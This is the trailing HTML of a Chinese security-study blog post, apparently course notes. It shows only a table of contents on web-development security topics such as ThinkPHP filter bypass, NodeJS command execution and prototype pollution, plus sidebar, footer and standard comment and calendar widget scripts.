href="#TP%E6%A1%86%E6%9E%B6-%E5%BC%80%E5%8F%91-%E9%85%8D%E7%BD%AE%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-MVC%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.6.1.</span> <span class="toc-text">TP框架-开发-配置架构&amp;路由&amp;MVC模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TP%E6%A1%86%E6%9E%B6-%E5%AE%89%E5%85%A8-%E4%B8%8D%E5%AE%89%E5%85%A8%E5%86%99%E6%B3%95-%E7%89%88%E6%9C%AC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.2.</span> <span class="toc-text">TP框架-安全-不安全写法&amp;版本过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%86%85%E7%BD%AE%E4%BB%A3%E7%A0%81%E5%86%99%E6%B3%95"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">1、内置代码写法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaScript"><span class="toc-number">2.</span> <span class="toc-text">JavaScript</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%A9-1"><span class="toc-number">2.1.</span> <span class="toc-text">第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E5%8E%9F%E7%94%9F%E5%BC%80%E5%8F%91-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%8F%98%E9%87%8F-%E5%AF%B9%E8%B1%A1-%E5%87%BD%E6%95%B0-%E4%BA%8B%E4%BB%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">JS原生开发-文件上传-变量&amp;对象&amp;函数&amp;事件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JS%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">JS函数介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFJS%E8%BF%9B%E8%A1%8C%E5%90%8E%E7%BC%80%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%90%8E%E7%AB%AFPHP%E8%BF%9B%E8%A1%8C%E4%B8%8A%E4%BC%A0%E5%A4%84%E7%90%86"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">前端JS进行后缀过滤，后端PHP进行上传处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E5%AF%BC%E5%85%A5%E5%BA%93%E5%BC%80%E5%8F%91-%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81-JQuery%E5%BA%93-Ajax%E6%8A%80%E6%9C%AF"><span class="toc-number">2.1.2.</span> <span class="toc-text">JS导入库开发-登录验证-JQuery库&amp;Ajax技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8js%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">使用js实现登录验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-1"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">安全加固</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E5%AF%BC%E5%85%A5%E5%BA%93%E5%BC%80%E5%8F%91-%E9%80%BB%E8%BE%91%E8%B4%AD%E4%B9%B0-JQuery%E5%BA%93-Ajax%E6%8A%80%E6%9C%AF"><span class="toc-number">2.1.3.</span> <span class="toc-text">JS导入库开发-逻辑购买-JQuery库&amp;Ajax技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8js%E5%AE%9E%E7%8E%B0%E5%95%86%E5%93%81%E8%B4%AD%E4%B9%B0"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">使用js实现商品购买</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E6%B5%8B%E8%AF%95-%E6%9F%90%E8%BF%9D%E8%A7%84APP-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E-JS%E9%AA%8C%E8%AF%81%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">实例测试-某违规APP-密码找回&amp;JS验证逻辑安全</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A9-1"><span class="toc-number">2.2.</span> <span class="toc-text">第二天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E6%8A%80%E6%9C%AF-DOM%E6%A0%91%E6%93%8D%E4%BD%9C%E5%8F%8A%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3"><span class="toc-number">2.2.1.</span> <span class="toc-text">JS技术-DOM树操作及安全隐患</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">安全问题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E5%AF%BC%E5%85%A5%E5%BA%93%E5%BC%80%E5%8F%91-%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">JS导入库开发-编码加密-逆向调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SHA1"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">SHA1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HMAC"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">HMAC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AES"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">AES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DES"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">DES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA"><span class="toc-number">2.2.2.6.</span> <span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95"><span class="toc-number">2.2.2.7.</span> <span class="toc-text">逆向调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%B3%E9%80%9A"><span class="toc-number">2.2.2.7.1.</span> <span class="toc-text">申通</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%A4%A9-1"><span class="toc-number">2.3.</span> <span class="toc-text">第三天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS-%E8%A7%A3%E6%9E%90%E5%AE%89%E8%A3%85-%E5%BA%93%E5%AE%89%E8%A3%85"><span class="toc-number">2.3.1.</span> <span class="toc-text">NodeJS-解析安装&amp;库安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS-%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%96%87%E4%BB%B6-%E6%89%A7%E8%A1%8C"><span class="toc-number">2.3.2.</span> <span class="toc-text">NodeJS-数据库&amp;文件&amp;执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">加入数据库操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">文件操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">命令执行（RCE）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-2"><span class="toc-number">2.3.3.</span> <span class="toc-text">安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">sql注入&amp;文件操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95NodeJS%E5%AE%89%E5%85%A8"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">实战测试NodeJS安全</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">原型链污染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%A4%A9-1"><span class="toc-number">2.4.</span> <span class="toc-text">第四天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebPack-%E4%BD%BF%E7%94%A8-%E5%AE%89%E5%85%A8"><span class="toc-number">2.4.1.</span> <span class="toc-text">WebPack-使用&amp;安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webpack%E5%AE%89%E5%85%A8"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">webpack安全</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81WebPack%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F-%E6%A8%A1%E5%BC%8F%E9%80%89%E6%8B%A9"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">1、WebPack源码泄漏-模式选择</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%8F%90%E5%8F%96%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5-PacketFuzzer"><span class="toc-number">2.4.1.4.</span> <span class="toc-text">模糊提取安全检查-PacketFuzzer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JQuery-%E4%BD%BF%E7%94%A8-%E5%AE%89%E5%85%A8"><span class="toc-number">2.4.2.</span> <span class="toc-text">JQuery-使用&amp;安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">1、使用：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/1288cce5.html" title="小迪安全--安全开发下篇(4)"><img src="/img/xiao_f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全--安全开发下篇(4)"/></a><div class="content"><a class="title" href="/posts/1288cce5.html" title="小迪安全--安全开发下篇(4)">小迪安全--安全开发下篇(4)</a><time datetime="2025-06-12T13:17:11.319Z" title="发表于 2025-06-12 21:17:11">2025-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b4ffc751.html" title="小迪安全--安全开发上篇(3)"><img src="/img/xiao_f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全--安全开发上篇(3)"/></a><div class="content"><a class="title" href="/posts/b4ffc751.html" title="小迪安全--安全开发上篇(3)">小迪安全--安全开发上篇(3)</a><time datetime="2025-06-12T13:08:57.606Z" title="发表于 2025-06-12 21:08:57">2025-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/dba72746.html" title="小迪安全--信息打点(2)"><img src="/img/xiao_f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全--信息打点(2)"/></a><div class="content"><a class="title" href="/posts/dba72746.html" title="小迪安全--信息打点(2)">小迪安全--信息打点(2)</a><time datetime="2025-05-18T02:57:49.848Z" title="发表于 2025-05-18 10:57:49">2025-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/944d69ee.html" title="云计算方向-Ansible搭建wordpress"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-Ansible搭建wordpress"/></a><div class="content"><a class="title" href="/posts/944d69ee.html" title="云计算方向-Ansible搭建wordpress">云计算方向-Ansible搭建wordpress</a><time datetime="2025-05-14T02:48:38.000Z" title="发表于 2025-05-14 10:48:38">2025-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a182640a.html" title="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题"/></a><div class="content"><a class="title" href="/posts/a182640a.html" title="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题">云计算方向-2023年金砖一带一路职业技能大赛云计算赛题</a><time datetime="2025-05-14T02:48:37.000Z" title="发表于 2025-05-14 10:48:37">2025-05-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/bottom-bg.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By GoldY</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo-ashen-rho.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo-ashen-rho.vercel.app/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start -->
  <script data-pjax src="/js/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=yuwenjin666";
            var git_color =['#ebedf0', '#a2f7af', '#6ce480', '#54ad63', '#469252', '#31753c', '#1f5f2a', '#13531f', '#084111', '#032b09', '#000000'];
            var git_user ="yuwenjin666";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>